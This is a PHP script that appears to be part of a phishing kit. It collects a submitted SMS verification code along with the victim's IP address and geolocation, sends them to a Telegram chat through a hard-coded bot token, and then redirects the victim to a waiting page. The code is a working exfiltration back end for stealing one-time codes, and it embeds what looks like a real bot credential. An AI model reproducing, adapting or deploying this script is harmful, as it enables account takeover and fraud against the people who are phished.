<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $codigo = trim($_POST['codigo'] ?? '');

    if (empty($codigo)) {
        die("Por favor ingresa el código.");
    }

    // Función para obtener la IP real del usuario
    function getRealIpAddr() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '127.0.0.1';
    }

    $ip = getRealIpAddr();

    // Usar ip-api.com (no requiere clave para pruebas básicas)
    $url = "http://ip-api.com/json/$ip";
    $json = @file_get_contents($url);
    $data = json_decode($json, true);

    // Validar y asignar datos
    $ciudad = isset($data['city']) && !empty($data['city']) ? $data['city'] : 'No disponible';
    $region = isset($data['regionName']) && !empty($data['regionName']) ? $data['regionName'] : 'No disponible';
    $pais = isset($data['country']) && !empty($data['country']) ? $data['country'] : 'No disponible';

    // Configuración del bot de Telegram
    $botToken = '8443737763:AAHDC6deCV73XbXV74gPZ862z8ZIOYoxfGk'; // Reemplaza con tu token
    $chatId = '-4558156483'; // Reemplaza con tu chat ID

    // Mensaje personalizado con marca de agua, IP y ciudad
    $marcaDeAgua = "@Brknshinexxx";
    $message = "Código SMS recibido 2:\nCódigo: $codigo\n\nIP: $ip\nCiudad: $ciudad\nRegión: $region\nPaís: $pais\n\n$marcaDeAgua";

    // URL de la API de Telegram
    $urlTelegram = "https://api.telegram.org/bot$botToken/sendMessage";

    $dataTelegram = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Enviar el mensaje
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($dataTelegram)
        ]
    ];

    $context = stream_context_create($options);
    @file_get_contents($urlTelegram, false, $context);

    // Redirigir a una página de espera o resultado
    header('Location: wait2.html');
    exit;
} else {
    header('HTTP/1.0 403 Forbidden');
    echo "Acceso no permitido.";
}
?>
